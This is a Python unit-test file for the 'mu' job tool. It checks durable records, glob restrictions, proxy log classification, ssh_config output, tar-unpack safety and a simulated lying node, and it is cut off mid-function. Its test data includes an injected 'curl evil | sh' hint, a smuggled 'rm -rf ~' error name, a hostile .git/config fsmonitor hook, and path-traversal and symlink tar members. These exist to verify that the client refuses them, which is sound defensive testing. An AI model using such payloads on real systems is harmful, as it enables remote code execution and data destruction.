"""Unit-level checks of the job layer that need no systemd, no ssh and no network (tools/test-jobs/run.sh runs them
with each Python under test). Usage: python unit.py SECTION [ARG...]. Prints one line per check, "ok    name" or
"FAIL  name" (with details on indented lines), and exits with the number of failed checks.

Sections: durable, atomic, ids, globs, proxy, classify, sshconfig, controlpath, unpack, untrusted-node, runner,
snapshot-alone, snapshot-content, snapshot-report, pins REPO."""
import hashlib
import io
import json
import os
import random
import shutil
import signal
import subprocess
import sys
import tarfile
import tempfile
import time

HERE = os.path.dirname(os.path.abspath(__file__))
REPO = os.path.dirname(os.path.dirname(HERE))
sys.path.insert(0, os.path.join(REPO, "src"))
from mu import durable, jobs, proto  # noqa: E402

FAILS = [0]


def check(name, cond, detail=""):
    if cond:
        print("ok    %s" % name)
    else:
        FAILS[0] += 1
        print("FAIL  %s" % name)
        if detail:
            print("\n".join("        | " + x for x in str(detail).splitlines()[:30]))


def tmpdir(tag):
    return tempfile.mkdtemp(prefix="mu jobs %s." % tag)


# ------------------------------------------------------------------------------------------------ durable
def t_durable():
    d = tmpdir("durable")
    good = {"schema": 1, "job_id": "20261114-101500-k3f9qa", "state": "failed", "exit_code": 3, "name": "μ ünïcode"}
    path = os.path.join(d, "r.json")
    durable.write_record(path, good)
    data = open(path, "rb").read()
    check("a sealed record reads back", durable.read_record(path) == durable.seal(good))
    check("write_durable leaves no temp files", sorted(os.listdir(d)) == ["r.json"], os.listdir(d))
    check("mode 0600 by default", (os.stat(path).st_mode & 0o777) == 0o600, oct(os.stat(path).st_mode))
    other = durable.dumps_record(dict(good, job_id="20261114-101500-zzzzzz"))
    changed = json.loads(data.decode())
    changed["state"] = "succeeded"
    digit = data.replace(b'"exit_code": 3', b'"exit_code": 4')
    nosum = json.loads(data.decode())
    nosum.pop("sha256")
    damaged = {
        "NUL bytes of the same length": b"\0" * len(data),
        "half NUL": data[:len(data) // 2] + b"\0" * (len(data) - len(data) // 2),
        "truncated": data[:len(data) - 7],
        "empty": b"",
        "a changed state with the old sum": json.dumps(changed).encode(),
        "one digit changed": digit,
        "no sum": json.dumps(nosum).encode(),
        "not an object": b"[1, 2, 3]",
        "another record's sum": data.replace(json.loads(data)["sha256"].encode(), json.loads(other)["sha256"].encode()),
        "not UTF-8": b"\xff\xfe" + data,
    }
    bad = []
    for what, b in damaged.items():
        with open(path, "wb") as f:
            f.write(b)
        if durable.read_record(path) is not None:
            bad.append(what)
    check("10 damaged records all read as absent (S3: NUL bytes of the right size included)", not bad, "accepted: %s" % bad)
    with open(path, "wb") as f:
        f.write(json.dumps(changed).encode())
    accepted = durable.read_record(path) is not None
    return d, path, data, changed, accepted


def t_durable_main():
    d, path, data, changed, accepted = t_durable()
    if durable.fault("no-checksum"):
        check("the changed record is rejected (fault no-checksum is on: this must FAIL)", not accepted)
    else:
        check("a changed record with the old sum is rejected: the check is what rejects it", not accepted)
    re = json.loads(data.decode())
    with open(path, "w") as f:
        json.dump(re, f, indent=4, sort_keys=False, ensure_ascii=True)
    check("a record re-formatted by another writer (indent, key order, escapes) is accepted", durable.read_record(path) is not None)
    with open(path, "wb") as f:
        f.write(b"x" * (16 * 1024 * 1024 + 10))
    check("a file over 16 MB reads as absent", durable.read_record(path) is None)
    check("a missing file reads as absent", durable.read_record(os.path.join(d, "nope.json")) is None)
    shutil.rmtree(d)


WRITER = r"""
import os, sys, time
sys.path.insert(0, sys.argv[1])
from mu import durable
path = sys.argv[2]
i = 0
pad = "x" * 20000
sys.stdout.write("ready\n"); sys.stdout.flush()
while True:
    i += 1
    durable.write_record(path, {"i": i, "pad": pad, "state": "running"})
"""


def t_atomic(n=120):
    """N kills (SIGKILL at a random moment) of a process rewriting a record: count the damaged ones."""
    d = tmpdir("atomic")
    path = os.path.join(d, "state.json")
    durable.write_record(path, {"i": 0, "pad": "", "state": "queued"})
    damaged = 0
    env = dict(os.environ)
    for k in range(n):
        p = subprocess.Popen([sys.executable, "-I", "-S", "-c", WRITER, os.path.join(REPO, "src"), path],
                             stdout=subprocess.PIPE, env=env)
        p.stdout.readline()
        time.sleep(random.uniform(0.0, 0.02))
        p.send_signal(signal.SIGKILL)
        p.wait()
        if durable.read_record(path) is None:
            damaged += 1
            durable.write_record(path, {"i": 0, "pad": "", "state": "queued"})
    shutil.rmtree(d)
    label = "%d kills of a writer leave 0 damaged records" % n
    check(label + (" (fault in-place is on: this must FAIL)" if durable.fault("in-place") else ""), damaged == 0,
          "%d of %d damaged" % (damaged, n))
    print("info  atomic: %d of %d damaged" % (damaged, n))


# ------------------------------------------------------------------------------------------------ ids, globs, sizes
def t_ids():
    ids = {proto.new_job_id() for _ in range(2000)}
    check("job ids match ^[0-9]{8}-[0-9]{6}-[0-9a-z]{6}$", all(proto.JOB_ID.match(i) for i in ids))
    check("2000 job ids made in one second are distinct", len(ids) == 2000, len(ids))
    jid = proto.new_job_id(1794650100)
    check("the time in a job id is UTC", jid.startswith(time.strftime("%Y%m%d-%H%M%S", time.gmtime(1794650100))) and
          proto.job_id_epoch(jid) == 1794650100, jid)
    for g, ok in (("results/*.json", True), ("frame/**/*.png", True), ("a.txt", True), ("../x", False), ("/etc/x", False),
                  ("a/../../b", False), ("", False), ("a\\b", False)):
        check("output glob %r is %s" % (g, "accepted" if ok else "refused"), proto.glob_ok(g) == ok)
    for pat, path, ok in (("results/*.json", "results/fea.json", True), ("results/*.json", "results/sub/x.json", False),
                          ("**/*.png", "a/b/c.png", True), ("**/*.png", "c.png", True), ("frame/img/*.png", "frame/img/a.png", True),
                          ("*.txt", "a/b.txt", False), ("out/**", "out/a/b", True)):
        check("glob %r %s %r" % (pat, "matches" if ok else "does not match", path), proto.glob_match(pat, path) == ok)
    for s, n in (("16G", 16 << 30), ("512M", 512 << 20), ("100K", 102400), ("64m", 64 << 20), ("1024", 1024), ("x", None),
                 ("0", None), ("2GiB", 2 << 30)):
        check("--mem %s = %s" % (s, n), proto.parse_size(s) == n, proto.parse_size(s))
    for s, n in (("90s", 90), ("30m", 1800), ("6h", 21600), ("2d", 172800), ("45", 45), ("1w", None), ("0s", None)):
        check("--time %s = %s" % (s, n), proto.parse_duration(s) == n, proto.parse_duration(s))
    for p, want in (("a/b", "a/b"), ("./a//b/", "a/b"), ("", ""), (".", ""), ("../a", None), ("/a", None), ("a/../b", None)):
        check("safe_relpath(%r) = %r" % (p, want), proto.safe_relpath(p) == want, proto.safe_relpath(p))


def t_globs():
    """The workstation's glob check is never wider than the node's glob.glob (review finding 1b)."""
    lax = durable.fault("dot-globs")
    tag = " (fault dot-globs is on: some of these must FAIL)" if lax else ""
    for pat, path, ok in (("**/*.json", ".claude/settings.json", False), ("**/*.json", ".mu/jobs/x.json", False),
                          ("*/config", ".git/config", False), ("*/config", ".GIT/config", False),
                          ("results/**", "results/.git/config", False), ("results/*", "results/.hidden", False),
                          ("**", ".envrc", False), ("**", "mu.toml", True), ("results/.keep", "results/.keep", True),
                          (".cache/*.json", ".cache/a.json", True), ("**/*.json", "a/b/c.json", True)):
        check("glob %r %s %r%s" % (pat, "matches" if ok else "does not match", path, tag), proto.glob_match(pat, path) == ok)
    for path, bad in ((".git/config", ".git"), ("a/.GIT/config", ".GIT"), (".Mu/jobs/x.json", ".Mu"), ("a/.git./x", ".git."),
                      ("results/a.json", None), (".github/x.yml", None), ("a/.mux", None)):
        check("forbidden part of %r is %r" % (path, bad), proto.forbidden_part(path) == bad, proto.forbidden_part(path))
    # the node's own glob agrees: what glob.glob finds for a pattern, glob_match accepts, and nothing more
    import glob as globmod
    d = tmpdir("globs")
    for f in ("results/a.json", "results/.h.json", ".claude/settings.json", "x/y/z.json", ".git/config", "mu.toml"):
        os.makedirs(os.path.dirname(os.path.join(d, f)) or d, exist_ok=True)
        open(os.path.join(d, f), "w").close()
    every = ["results/a.json", "results/.h.json", ".claude/settings.json", "x/y/z.json", ".git/config", "mu.toml"]
    bad = []
    for pat in ("**/*.json", "**", "results/*", "*/config", "**/*"):
        found = {x for x in globmod.glob(pat, root_dir=d, recursive=True) if os.path.isfile(os.path.join(d, x))}
        mine = {x for x in every if proto.glob_match(pat, x)}
        if found != mine:
            bad.append("%s: glob %s, glob_match %s" % (pat, sorted(found), sorted(mine)))
    check("glob_match accepts exactly what the node's glob.glob finds (5 patterns)%s" % tag, not bad, "\n".join(bad))
    shutil.rmtree(d)


# ------------------------------------------------------------------------------------------------ the proxy's rules
CHISEL_LINES = [   # recorded from chisel 1.12.0 in the experiments of 2026-11-14 (date and time cut off)
    (["client: Connecting to ws://127.0.0.1:18080", "client: Connected (Latency 989.375µs)"], ("ok", "connected")),
    (["client: Connection error: ssh: handshake failed: Invalid fingerprint (ubILCH8awo2GQII9Z9eLRD+LOo4qXabtMrJjCleonuI=)",
      "client: Give up"], ("refused", "relay-fingerprint")),
    (["client: Connection error: ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], "
      "no supported methods remain", "connection attempts exhausted"], ("refused", "relay-credential")),
    (["client: Connected (Latency 1ms)", "client: Connection error: server: access to '127.0.0.1:7002' denied"],
     ("refused", "relay-rule")),
    (["client: Connected (Latency 1ms)", 'client: tun: proxy#stdio=>7001: conn#1: Stream error: ssh: rejected: connect '
      'failed ("dial tcp 127.0.0.1:7001: connect: connection refused")'], ("unreachable", "node-offline")),
    (["client: Connecting to ws://127.0.0.1:18080", "client: Connection error: dial tcp 127.0.0.1:18080: connect: "
      "connection refused", "client: Give up"], ("unreachable", "relay-unreachable")),
    (["client: Connection error: dial tcp: lookup relay.invalid: no such host"], ("unreachable", "relay-unreachable")),
    (["client: Connected (Latency 1ms)", "client: Connection error: websocket: close 1006 (abnormal closure): unexpected EOF",
      "client: Give up"], ("unreachable", "relay-lost")),
    (["client: Connected (Latency 1ms)", "client: Disconnected", "client: Give up"], ("unreachable", "relay-lost")),
]


def t_proxy():
    for lines, want in CHISEL_LINES:
        connected, verdict = False, None
        for ln in lines:
            v = jobs.proxy_verdict(ln, connected)
            if v == ("ok", "connected"):
                connected = True
                verdict = verdict or v
                continue
            if v and (verdict is None or verdict[0] == "ok"):
                verdict = v
                break
        check("chisel lines -> %s %s: %s" % (want[0], want[1], lines[-1][:70]), verdict == want, verdict)


def t_classify():
    conf = {"name": "office-pc", "relay_user": "avi-mac", "relay_port": "7001", "relay_url": "https://relay.example"}
    cases = [
        (("refused", "relay-credential", "1", ""), "", False, 5, "relay-credential"),
        (("refused", "relay-fingerprint", "1", ""), "", False, 5, "relay-fingerprint"),
        (("refused", "relay-rule", "1", ""), "", False, 5, "relay-rule"),
        (("unreachable", "node-offline", "1", ""), "", False, 4, "node-offline"),
        (("unreachable", "relay-unreachable", "1", ""), "", False, 4, "relay-unreachable"),
        (("unreachable", "relay-lost", "1", ""), "", False, 4, "relay-lost"),
        (("ok", "connected", "1", ""), "@@@ WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED! @@@", False, 5, "host-key"),
        (("ok", "connected", "1", ""), "Host key verification failed.", False, 5, "host-key"),
        (("ok", "connected", "1", ""), "mu@mu-office-pc: Permission denied (publickey).", False, 5, "key-not-authorised"),
        (("ok", "connected", "1", ""), "Connection timed out during banner exchange", False, 4, "unreachable"),
        (None, "client_loop: send disconnect: Broken pipe", True, 4, "unreachable"),
        (None, "Connection closed by UNKNOWN port 65535", False, 1, "proxy-failed"),
        (("error", "keychain-locked", "1", "the login keychain is locked"), "", False, 1, "keychain-locked"),
    ]
    for st, err, muxed, code, name in cases:
        try:
            jobs.classify_255(conf, err, st, muxed)
            got = None
        except proto.MuError as e:
            got = (e.code, e.error)
        check("ssh exit 255 with status %s and %r -> exit %d (%s)" % (st and st[1], err[:40], code, name), got == (code, name), got)
    # the remedies name the way the node was paired (usability review of ff2c707, 13)
    def hint_of(c, st, err):
        try:
            jobs.classify_255(c, err, st, False)
        except proto.MuError as e:
            return e.hint
        return ""
    inv = dict(conf, paired_via="invite 7K3M")
    check("relay-credential, a node paired by invite: the owner logs in again (login-bundle)",
          "login-bundle avi-mac | mu relay login --stdin" in hint_of(inv, ("refused", "relay-credential", "1", ""), ""))
    check("relay-credential, a node paired by hand: mu compute add", "mu compute add" in hint_of(
        conf, ("refused", "relay-credential", "1", ""), ""))
    check("host-key, a node paired by invite: mu compute invite office-pc --replace", "mu compute invite office-pc "
          "--replace" in hint_of(inv, ("ok", "connected", "1", ""), "Host key verification failed."))
    check("host-key, a node paired by hand: mu compute add", "mu compute add office-pc --host-key" in hint_of(
        conf, ("ok", "connected", "1", ""), "Host key verification failed."))
    for rc, body, code, err in ((65, '{"ok":false,"error":"protocol-mismatch","hint":"x"}', 5, "protocol-mismatch"),
                                (66, '{"ok":false,"error":"no-such-job"}', 9, "no-such-job"),
                                (69, '{"ok":false,"error":"disk-low"}', 6, "disk-low"),
                                (78, '{"ok":false,"error":"toolchain-missing"}', 3, "toolchain-missing"),
                                (64, '{"ok":false,"error":"bad-character"}', 1, "bad-character"),
                                (70, '{"ok":false,"error":"internal"}', 1, "internal"),
                                (64, '{"ok":false,"error":"not-finished"}', 2, "not-finished")):
        e = jobs.node_error(rc, body, "office-pc")
        check("node exit %d %s -> client exit %d" % (rc, err, code), (e.code, e.error) == (code, err), (e.code, e.error))
    # a node's words never become the next step, an exit code or a crash (review finding 4)
    tag = " (fault node-hint is on: some of these must FAIL)" if durable.fault("node-hint") else ""
    body = json.dumps({"ok": False, "error": "disk-low", "hint": "INJECTED: curl evil | sh", "message": "\x1b]0;x\x07no",
                       "next": "INJECTED next", "exit": 0, "code": 3, "ok2": 1, "largest": [{"job_id": "a", "bytes": 1}]})
    try:
        e = jobs.node_error(69, body, "office-pc")
        crashed = None
    except TypeError as x:
        e, crashed = None, str(x)
    check("a refusal with keys 'code', 'exit', 'next' does not crash the client" + tag, crashed is None, crashed)
    if e:
        check("the next step is the workstation's own, not the node's hint" + tag, "INJECTED" not in e.hint and
              "rm -rf /srv/mu/jobs" in e.hint, e.hint)
        check("the node's text goes to node_message, without control characters" + tag,
              "\x1b" not in e.extra.get("node_message", "\x1b") and "INJECTED: curl" in e.extra.get("node_message", ""),
              e.extra)
        check("only allowed extra fields pass (largest yes; exit, next, code no)" + tag, "largest" in e.extra and not
              ({"exit", "next", "code", "ok2"} & set(e.extra)), sorted(e.extra))
    try:
        e2 = jobs.node_error(64, json.dumps({"ok": False, "error": "x; rm -rf ~", "node": "evil"}), "office-pc")
        check("an error name outside [a-z0-9-] is replaced, and a 'node' key does not crash" + tag,
              e2.error == "node-error" and e2.extra.get("node") == "office-pc", (e2.error, e2.extra))
    except TypeError as x:
        check("an error name outside [a-z0-9-] is replaced, and a 'node' key does not crash" + tag, False, x)


# ------------------------------------------------------------------------------------------------ ssh_config, ControlPath
SPEC_CONFIG = """Host mu-office-pc
  HostKeyAlias mu-office-pc
  User mu
  IdentityFile "<MU_HOME>/compute/office-pc/id_ed25519"
  IdentitiesOnly yes
  IdentityAgent none
  UserKnownHostsFile "<MU_HOME>/compute/office-pc/known_hosts"
  GlobalKnownHostsFile /dev/null
  StrictHostKeyChecking yes
  UpdateHostKeys no
  CheckHostIP no
  HostKeyAlgorithms ssh-ed25519
  PreferredAuthentications publickey
  PasswordAuthentication no
  KbdInteractiveAuthentication no
  BatchMode yes
  ClearAllForwardings yes
  ForwardAgent no
  ForwardX11 no
  RequestTTY no
  PermitLocalCommand no
  Compression yes
  ConnectTimeout 30
  ServerAliveInterval 15
  ServerAliveCountMax 3
  ControlMaster auto
  ControlPersist 300
  ProxyCommand "<MU_HOME>/bin/mu" compute proxy office-pc
"""


def t_sshconfig():
    home = "/Users/x/Library/Mu with space"
    got = jobs.ssh_config_text("office-pc", home)
    want = SPEC_CONFIG.replace("<MU_HOME>", home)
    check("ssh_config is exactly the specification's (§5.1)" + (" (fault no-strict-hostkey is on: this must FAIL)" if
          durable.fault("no-strict-hostkey") else ""), got == want,
          "\n".join(a + "  !=  " + b for a, b in zip(got.splitlines(), want.splitlines()) if a != b))
    check("a '%' in MU_HOME is doubled (ssh tokens)", '"/a%%b/compute/n/id_ed25519"' in jobs.ssh_config_text("n", "/a%b"))
    for bad in ('/a"b', "/a$b", "/a`b", "/a\\b", "/a'b"):
        try:
            jobs.ssh_config_text("n", bad)
            ok = False
        except proto.MuError:
            ok = True
        check("MU_HOME %r is refused for ssh_config" % bad, ok)
    if shutil.which("ssh"):
        d = tmpdir("sshcfg")
        cfg = os.path.join(d, "ssh_config")
        with open(cfg, "w") as f:
            f.write(jobs.ssh_config_text("office-pc", d))
        r = subprocess.run(["ssh", "-G", "-F", cfg, "-o", 'ControlPath="%s/run/x.sock"' % d, "mu-office-pc"],
                           capture_output=True, text=True)
        g = r.stdout.lower()
        check("ssh -G reads it: identityagent none, stricthostkeychecking true, batchmode yes, forwardagent no, "
              "clearallforwardings yes", r.returncode == 0 and "identityagent none" in g and "batchmode yes" in g and
              "stricthostkeychecking true" in g and "forwardagent no" in g and "clearallforwardings yes" in g and
              "controlpath %s/run/x.sock" % d.lower() in g, r.stderr + r.stdout[:500])
        shutil.rmtree(d)


def t_controlpath():
    old = os.environ.get("MU_HOME")
    try:
        short = tempfile.mkdtemp(prefix="mucp.", dir="/tmp")
        os.environ["MU_HOME"] = short
        cp = jobs.control_path("office-pc")
        limit = 103 if sys.platform == "darwin" else 107
        check("a short MU_HOME keeps the socket in $MU_HOME/run", cp == os.path.join(short, "run", "office-pc.sock"), cp)
        long = os.path.join(short, "x" * 60, "y" * 30)
        os.makedirs(long)
        os.environ["MU_HOME"] = long
        cp2 = jobs.control_path("office-pc")
        check("a long MU_HOME moves it to /tmp/mu-<uid> (len + 17 <= %d)" % limit,
              cp2 == "/tmp/mu-%d/office-pc.sock" % os.getuid() and len(cp2) + 17 <= limit, cp2)
        st = os.lstat("/tmp/mu-%d" % os.getuid())
        check("/tmp/mu-<uid> is a real folder, ours, mode 0700", (st.st_mode & 0o777) == 0o700 and st.st_uid == os.getuid())
        exact = os.path.join(short, "z" * (limit - 17 - len(short) - len("/run/office-pc.sock") - 1))
        os.makedirs(exact)
        os.environ["MU_HOME"] = exact
        cp3 = jobs.control_path("office-pc")
        check("a socket path of exactly %d bytes stays in $MU_HOME/run" % (limit - 17), cp3.startswith(exact) and
              len(cp3) + 17 == limit, (len(cp3), cp3))
        shutil.rmtree(short)
    finally:
        if old is None:
            os.environ.pop("MU_HOME", None)
        else:
            os.environ["MU_HOME"] = old


# ------------------------------------------------------------------------------------------------ fetch: unpack safety
def tar_stream(members):
    """members: list of (name, bytes | ('symlink', target) | ('dir',))"""
    buf = io.BytesIO()
    tf = tarfile.open(fileobj=buf, mode="w|", format=tarfile.PAX_FORMAT)
    for name, body in members:
        ti = tarfile.TarInfo(name)
        if isinstance(body, tuple) and body[0] == "symlink":
            ti.type, ti.linkname = tarfile.SYMTYPE, body[1]
            tf.addfile(ti)
        elif isinstance(body, tuple) and body[0] == "dir":
            ti.type = tarfile.DIRTYPE
            tf.addfile(ti)
        else:
            ti.size = len(body)
            tf.addfile(ti, io.BytesIO(body))
    tf.close()
    return io.BytesIO(buf.getvalue())


def out(path, body):
    return {"path": path, "size": len(body), "sha256": hashlib.sha256(body).hexdigest()}


def t_unpack():
    a, b = b"alpha\n", b"beta beta\n"
    res = {"outputs": [out("results/a.json", a), out("img/b.png", b)]}
    declared = ["results/*.json", "img/*.png"]
    rj = ("result.json", b"{}")
    fetch_fault = durable.fault("no-member-check") or durable.fault("no-fetch-hash")

    def run(members, result=res, decl=declared, pre=None):
        base = tmpdir("unpack-base")   # "outside" is checked in a folder of its own, never the shared temp folder
        d = os.path.join(base, "project")
        os.mkdir(d)
        if pre:
            pre(d)
        try:
            w = jobs.unpack_outputs(tar_stream(members), result, d, decl)
            err = None
        except jobs.FetchError as e:
            w, err = None, str(e)
        files = sorted(os.path.relpath(os.path.join(dp, f), d) for dp, _, fs in os.walk(d) for f in fs)
        outside = os.path.exists(os.path.join(base, "evil.txt"))
        shutil.rmtree(base)
        return w, err, files, outside
    w, err, files, _ = run([rj, ("results/a.json", a), ("img/b.png", b)])
    check("good stream: both outputs written", w == ["results/a.json", "img/b.png"] and files == ["img/b.png", "results/a.json"],
          (w, err, files))
    cases = [
        ("a member outside the declared outputs", [rj, ("results/a.json", a), ("img/b.png", b), ("outside.txt", b"x")], None),
        ("a member that is not the next output", [rj, ("img/b.png", b), ("results/a.json", a)], None),
        ("an absolute member path", [rj, ("/nonexistent-mu-test/evil.txt", a)], None),
        ("a '..' member path", [rj, ("results/../../evil.txt", a)], None),
        ("a symlink member", [rj, ("results/a.json", ("symlink", "/etc/passwd"))], None),
        ("a directory member", [rj, ("results/a.json", ("dir",))], None),
        ("a size that differs from the result", [rj, ("results/a.json", a + b"x"), ("img/b.png", b)], None),
        ("content with another SHA-256", [rj, ("results/a.json", a.upper()), ("img/b.png", b)], None),
        ("a stream that ends early", [rj, ("results/a.json", a)], None),
        ("an output under no declared glob", [rj, ("other/a.json", a)],
         {"outputs": [out("other/a.json", a)]}),
        ("an output recorded with '..'", [rj, ("../evil.txt", a)], {"outputs": [out("../evil.txt", a)]}),
    ]
    for name, members, result in cases:
        w, err, files, outside = run(members, result or res)
        check("refused: %s%s" % (name, " (a fetch fault is on: some of these must FAIL)" if fetch_fault else ""),
              err is not None and not outside and not any("evil" in f or "outside" in f for f in files),
              "written: %s, files: %s" % (w, files))
    w, err, files, _ = run([rj, ("results/a.json", a), ("img/b.png", b)],
                           pre=lambda d: os.symlink("/tmp", os.path.join(d, "results")))
    check("refused: a project folder that is a symlink (it could lead outside)", err is not None and "a.json" not in str(files),
          (w, err, files))
    w, err, files, _ = run([rj, ("results/a.json", a), ("img/b.png", b)],
                           pre=lambda d: (os.mkdir(os.path.join(d, "results")),
                                          os.symlink("/tmp/x-mu-target", os.path.join(d, "results", "a.json"))))
    check("refused: an existing output that is a symlink", err is not None and not os.path.exists("/tmp/x-mu-target"), (w, err))
    w, err, files, _ = run([rj, ("results/a.json", a), ("img/b.png", b + b"!")])
    check("a mismatch keeps the files before it and writes nothing from that file on", files == ["results/a.json"] and
          err is not None, (files, err))
    # outputs never go into .git or .mu, whatever the globs (review finding 1b)
    cfg = b"[core]\n\tfsmonitor = touch PWNED\n"
    tag = " (fault dot-globs is on: this must FAIL)" if durable.fault("dot-globs") else ""
    w, err, files, _ = run([rj, (".git/config", cfg)], {"outputs": [out(".git/config", cfg)]}, ["**", ".git/*"])
    check("refused: .git/config even when a glob names it" + tag, err is not None and ".git/config" not in files, (w, files))
    w, err, files, _ = run([rj, (".claude/settings.json", cfg)], {"outputs": [out(".claude/settings.json", cfg)]},
                           ["**/*.json"])
    check("refused: .claude/settings.json under **/*.json (a wildcard never matches a hidden name)" + tag,
          err is not None and not files, (w, files))
    # a member longer than the result records stops at once, before it is written (review finding 5)
    big = b"z" * (3 << 20)
    tag = " (fault no-size-guard is on: this must FAIL)" if durable.fault("no-size-guard") else ""
    w, err, files, _ = run([rj, ("results/a.json", big)], {"outputs": [dict(out("results/a.json", big), size=10)]})
    check("refused before reading: a member of 3 MB that the result records as 10 bytes" + tag,
          err is not None and "10" in err and "bytes; the result records" in err, err)


# ------------------------------------------------------------------------------------------------ an untrusted node
def t_untrusted_node():
    """The real `mu fetch` and a refusal, through cli.py, against fake-node-ssh.py (a node that lies)."""
    d = tmpdir("untrusted")
    env = dict(os.environ, MU_HOME=os.path.join(d, "mu"), MU_SRC=os.path.join(REPO, "src"),
               MU_SSH=os.path.join(HERE, "fake-node-ssh.py"), MU_CHISEL="/usr/bin/true", HOME=d)
    for k in ("FAKE_PLAN", "FAKE_GLOBS", "FAKE_REFUSE", "MU_PROJECT", "MU_VERSION"):
        env.pop(k, None)
    cli = [sys.executable, "-I", "-S", os.path.join(REPO, "src", "mu", "cli.py")]
    blob = b"\x00\x00\x00\x0bssh-ed25519\x00\x00\x00\x20" + b"\x01" * 32
    import base64
    hk = "ssh-ed25519 " + base64.b64encode(blob).decode()
    r = subprocess.run(cli + ["compute", "add", "office-pc", "--host-key", hk, "--relay", "https://relay.example",
                              "--relay-fingerprint", "A" * 43 + "=", "--relay-user", "avi-mac", "--secret-store", "file",
                              "--relay-password-stdin", "--json"], input=b"pw-pw-pw-pw-pw-pw-pw-pw-pw\n", env=env,
                       capture_output=True)
    check("pairing a fake node (no network)", r.returncode == 0, r.stdout + r.stderr)
    proj = os.path.join(d, "proj")
    os.makedirs(proj)
    git(proj, "init", "-q")
    with open(os.path.join(proj, "mu.toml"), "w") as f:
        f.write('[mu]\nversion = "v2026.11.6"\n[compute]\noutputs = ["results/*.json"]\n')
    git(proj, "add", "mu.toml")
    git(proj, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-qm", "init")
    jid = "20261114-120000-abcdef"
    os.makedirs(os.path.join(proj, ".mu", "jobs"))
    durable.write_record(os.path.join(proj, ".mu", "jobs", jid + ".json"), {
        "schema": 1, "job_id": jid, "node": "office-pc", "state": "queued",
        "spec": {"job_id": jid, "outputs": ["results/*.json"]}})
    evil = [{"path": ".git/config", "data": "[core]\n\tfsmonitor = \"touch PWNED; false\"\n"},
            {"path": ".claude/settings.json", "data": '{"hooks": {}}\n'},
            {"path": "mu.toml", "data": '[mu]\nversion = "evil"\n'},
            {"path": "results/a.json", "data": '{"ok": 1}\n'}]
    before = {f: open(os.path.join(proj, f), "rb").read() for f in (".git/config", "mu.toml")}
    tag = " (fault trust-node-globs is on: this must FAIL)" if durable.fault("trust-node-globs") else ""
    for plan, globs, name in (([evil[2], evil[3]], ["**"], "mu.toml, which the node's globs (**) cover"),
                              ([evil[0], evil[3]], ["**"], ".git/config"),
                              ([evil[1], evil[3]], ["**"], ".claude/settings.json")):
        e = dict(env, FAKE_PLAN=json.dumps(plan), FAKE_GLOBS=json.dumps(globs))
        r = subprocess.run(cli + ["fetch", jid, "--json"], cwd=proj, env=e, capture_output=True)
        after = {f: open(os.path.join(proj, f), "rb").read() for f in (".git/config", "mu.toml")}
        check("mu fetch refuses %s outside this clone's declared results/*.json (exit 8, nothing changed)%s" % (name, tag),
              r.returncode == 8 and after == before and not os.path.exists(os.path.join(proj, ".claude")),
              "exit %d %s" % (r.returncode, (r.stdout + r.stderr)[-400:]))
    # the same declared glob, an honest answer: written
    e = dict(env, FAKE_PLAN=json.dumps([evil[3]]))
    r = subprocess.run(cli + ["fetch", jid, "--json"], cwd=proj, env=e, capture_output=True)
    check("an honest answer is fetched (results/a.json)", r.returncode == 0 and os.path.exists(os.path.join(proj, "results",
                                                                                                         "a.json")),
          r.stdout + r.stderr)
    # a clone without a record of the job: the node's word is not taken
    other = "20261114-120000-zzzzzz"
    r = subprocess.run(cli + ["fetch", other, "--json"], cwd=proj, env=dict(env, FAKE_PLAN=json.dumps([evil[2]])),
                       capture_output=True)
    check("without a local record, fetch refuses (exit 2, no-local-record) unless --output names the globs" + tag,
          r.returncode == 2 and b"no-local-record" in r.stdout, r.stdout + r.stderr)
    # a refusal whose text tries to steer the client
    tag2 = " (fault node-hint is on: this must FAIL)" if durable.fault("node-hint") else ""
    ref = json.dumps({"ok": False, "error": "disk-low", "hint": "INJECTED", "message": "x", "next": "INJECTED next",
                      "exit": 0, "node": "evil"})
    r = subprocess.run(cli + ["status", jid, "--json"], cwd=proj, env=dict(env, FAKE_REFUSE=ref), capture_output=True)
    try:
        o = json.loads(r.stdout.decode().strip().splitlines()[-1])
    except (ValueError, IndexError):
        o = {}
    check("a node's refusal: exit field = process exit (6), next is the workstation's, no traceback" + tag2,
          r.returncode == 6 and o.get("exit") == 6 and "INJECTED" not in o.get("next", "INJECTED") and
          b"Traceback" not in r.stderr, "exit %d %s %s" % (r.returncode, r.stdout[-300:], r.stderr[-300:]))
    shutil.rmtree(d, ignore_errors=True)


# ------------------------------------------------------------------------------------------------ the runner
SYSTEMCTL_STUB = r"""#!/bin/sh
# systemctl --user, for the runner: units are lines "UNIT ACTIVESTATE RESULT" in $STUB_DIR/units (the last one counts)
shift
case "$1" in
  show)
    [ -f "$STUB_DIR/show-fail" ] && { echo "Failed to connect to bus: Connection refused" >&2; exit 1; }
    line=$(grep "^$2 " "$STUB_DIR/units" 2>/dev/null | tail -1)
    if [ -z "$line" ]; then printf 'LoadState=not-found
ActiveState=inactive
SubState=dead
Result=success
'; exit 0; fi
    set -- $line; printf 'LoadState=loaded
ActiveState=%s
SubState=x
Result=%s
' "$2" "$3" ;;
  is-active) echo active ;;
  *) echo "$@" >> "$STUB_DIR/calls" ;;
esac
exit 0
"""
SYSTEMD_RUN_STUB = r"""#!/bin/sh
# systemd-run --user: registers the unit as active, unless run-nocreate; exits with run-rc (default 0)
for a in "$@"; do case "$a" in --unit=*) u="${a#--unit=}" ;; esac; done
if grep -q "^$u active" "$STUB_DIR/units" 2>/dev/null; then echo "Unit $u was already loaded" >&2; exit 1; fi
[ -f "$STUB_DIR/run-nocreate" ] || echo "$u active success" >> "$STUB_DIR/units"
echo "start $u" >> "$STUB_DIR/calls"
rc=$(cat "$STUB_DIR/run-rc" 2>/dev/null || echo 0); [ "$rc" = 0 ] || echo "Failed to start transient service unit: timed out" >&2
exit $rc
"""


def t_runner():
    """The runner's passes against stubs of systemctl and systemd-run (review: durability 1-5). Each scenario starts
    from an empty node; work/ is made by a stand-in for the git checkout."""
    base = tmpdir("runner")
    stubs = os.path.join(base, "bin")
    os.makedirs(stubs)
    for name, text in (("systemctl", SYSTEMCTL_STUB), ("systemd-run", SYSTEMD_RUN_STUB)):
        with open(os.path.join(stubs, name), "w") as f:
            f.write(text)
        os.chmod(os.path.join(stubs, name), 0o755)
    os.environ.update(MU_SYSTEMCTL=os.path.join(stubs, "systemctl"), MU_SYSTEMD_RUN=os.path.join(stubs, "systemd-run"),
